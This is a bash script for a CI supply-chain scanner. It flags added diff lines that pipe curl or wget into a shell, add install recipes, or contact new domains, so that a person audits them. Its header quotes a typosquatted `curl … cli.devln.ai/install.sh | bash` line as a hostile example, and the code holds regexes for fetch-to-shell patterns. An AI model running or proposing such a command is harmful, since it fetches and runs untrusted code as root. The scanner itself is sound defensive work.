#!/usr/bin/env bash
# DIVE-2279 — supply-chain surface scanner.
#
# WHAT THIS IS FOR, and it is not "blocking bad PRs": it AIMS a human audit.
# A legitimate `curl -fsSL https://cli.devin.ai/install.sh | bash` and a hostile
# `curl -fsSL https://cli.devln.ai/install.sh | bash` are BYTE-INDISTINGUISHABLE
# to shellcheck, to the unit suite, to harness-verdict, and to a person skimming
# 145 lines of bash. Only the DOMAIN differs. So this does not try to judge — it
# finds the handful of lines where judgement is required and puts them in front
# of someone, because "review this PR" gets skimmed and "is cli.devln.ai the
# right domain" gets checked.
#
# lodar 2026-07-29 (DIVE-2279 gate, answer B): outside PRs do NOT get a per-PR
# human approval tap — "I don't want to be bothered by rubber stamping approvals,
# I want you to act more cautious". An approval granted without reading is a
# label wearing a human's name. So the bar is agent-held and this is what aims it.
#
# Usage:  supply-chain-scan.sh <base-sha> <head-sha> [repo-root]
# Exit:   0 = nothing to audit   3 = findings (audit required)   2 = could not scan
#
# FAILS LOUD, NEVER OPEN. If the diff cannot be computed we exit 2 and say so.
# A scanner that returns "clean" when it could not look is the exact defect this
# repo spent 2026-07-28 removing from six other controls.

set -uo pipefail

BASE="${1:-}"; HEAD="${2:-}"; ROOT="${3:-.}"
[[ -n "$BASE" && -n "$HEAD" ]] || { echo "usage: supply-chain-scan.sh <base-sha> <head-sha> [root]" >&2; exit 2; }

cd "$ROOT" 2>/dev/null || { echo "supply-chain-scan: cannot enter '$ROOT'" >&2; exit 2; }

# NOT-REACHED is a third state: prove we can actually diff before claiming clean.
if ! git rev-parse --verify "$BASE^{commit}" >/dev/null 2>&1; then
  echo "supply-chain-scan: base '$BASE' is not a commit here — REFUSING to report clean" >&2; exit 2
fi
if ! git rev-parse --verify "$HEAD^{commit}" >/dev/null 2>&1; then
  echo "supply-chain-scan: head '$HEAD' is not a commit here — REFUSING to report clean" >&2; exit 2
fi

# COMMENT LINES ARE NOT EXECUTABLE SURFACE, and matching them is not a harmless false
# positive — it is the failure mode that kills the control. Measured: this scanner run
# against its OWN branch reports its own header prose (the `curl … | bash` and
# `cli.devln.ai` examples that explain what it looks for) as three findings plus a
# NEW-DOMAIN. That is why its first CI run went red on exit 3. A guard that fires on
# documentation of itself teaches the reader its findings are noise, and the next real
# finding gets skimmed with the same reflex — the "trains everyone to ignore red" shape.
#
# Only a line whose FIRST non-blank character is `#` is dropped: `foo # curl|bash` still
# carries executable code and is still scanned. LIMIT, stated because a silent one is how
# this class returns: a `#` opening a line inside a multi-line STRING literal is dropped
# too. Acceptable here — the surface this guards is bash, python and yaml, where `#` is a
# comment in all three. Defined ABOVE its use on purpose: a function referenced before
# definition would empty ADDED and make this scanner report "none" on every diff.
strip_comments() { grep -vE '^[[:space:]]*#' ; }

ADDED="$(git diff "$BASE..$HEAD" -- . ':(exclude)5dive' ':(exclude)5dive.sha256' \
        | grep -E '^\+' | grep -vE '^\+\+\+' | sed 's/^+//' | strip_comments)" || true
# An empty diff is a real answer; an unreadable one is not, and we exited above.

rc=0
emit() { rc=3; printf '  %s\n' "$1"; }

echo "== supply-chain surface added by this diff =="

# 1. FETCH-TO-SHELL — code fetched over the network and executed, as root on every box.
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  _INTERP='(ba|z|k|da)?sh|python[0-9.]*|perl|ruby|node|php'
  # MEASURED against a synthetic hostile diff rather than reasoned about: the first cut
  # matched only sh/bash after a pipe, so `curl … | python3` MISSED and `bash <(curl …)`
  # MISSED. The second is the dangerous one — NEW-DOMAIN is the backstop for an unknown
  # host, but a fetch-to-shell from a domain ALREADY trusted in the base tree yields no
  # new domain, so process substitution slipped past BOTH checks and this printed "none".
  printf '%s' "$line" | grep -qE "(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?($_INTERP)\b" \
    && { emit "FETCH-TO-SHELL: $(printf '%s' "$line" | sed 's/^[[:space:]]*//' | cut -c1-140)"; continue; }
  printf '%s' "$line" | grep -qE "($_INTERP|source|\.)[[:space:]]+<\([[:space:]]*(curl|wget)" \
    && { emit "FETCH-TO-SHELL(procsub): $(printf '%s' "$line" | sed 's/^[[:space:]]*//' | cut -c1-140)"; continue; }
  printf '%s' "$line" | grep -qE '(eval|exec)[^;]*\$\([[:space:]]*(curl|wget)' \
    && { emit "FETCH-TO-SHELL(eval): $(printf '%s' "$line" | sed 's/^[[:space:]]*//' | cut -c1-140)"; continue; }
done <<< "$ADDED"

# 2. NEW TYPE_INSTALL RECIPE — the agent-type install path, which runs as root.
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  printf '%s' "$line" | grep -qE '^\s*\[[a-z0-9_-]+\]="' \
    && printf '%s' "$line" | grep -qE 'curl|wget|npm|pip|install' \
    && emit "INSTALL-RECIPE: $(printf '%s' "$line" | sed 's/^[[:space:]]*//' | cut -c1-140)"
done <<< "$ADDED"

# 3. NEW DOMAIN — a host this repo did not previously contact. This is THE check:
#    the typosquat is invisible everywhere else, and "new" is what makes it small
#    enough to read. A domain already in the base tree is not a finding.
NEWHOSTS="$(printf '%s\n' "$ADDED" | grep -ohE 'https?://[A-Za-z0-9.-]+' \
            | sed -E 's#https?://##' | tr 'A-Z' 'a-z' | sort -u)"
if [[ -n "$NEWHOSTS" ]]; then
  BASEHOSTS="$(git grep -ohE 'https?://[A-Za-z0-9.-]+' "$BASE" -- . 2>/dev/null \
               | sed -E 's#https?://##' | tr 'A-Z' 'a-z' | sort -u)"
  while IFS= read -r h; do
    [[ -z "$h" ]] && continue
    printf '%s\n' "$BASEHOSTS" | grep -qxF "$h" || emit "NEW-DOMAIN: $h  (not contacted anywhere in $BASE)"
  done <<< "$NEWHOSTS"
fi

if (( rc == 0 )); then
  echo "  none — no new fetch-to-shell, install recipe, or domain in this diff"
  echo
  # State the blind spots ON THE CLEAN PATH: this is the line that gets acted on, and
  # limits that live only in the header are not met at the moment of the decision.
  echo "  NOT A CLEARANCE. Line-oriented heuristic over added lines: it cannot see a"
  echo "  payload split across lines, fetch-then-exec via a temp file, an indirected host,"
  echo "  or anything inside the bundle (bundle-drift covers that; it runs on pull_request)."
  echo "  'none' means nothing MATCHED, not 'this diff is safe'."
else
  echo
  echo "AUDIT REQUIRED. These lines are where a hostile change is indistinguishable"
  echo "from a legitimate one by any automated means. Read them; do not skim the PR."
fi
exit $rc
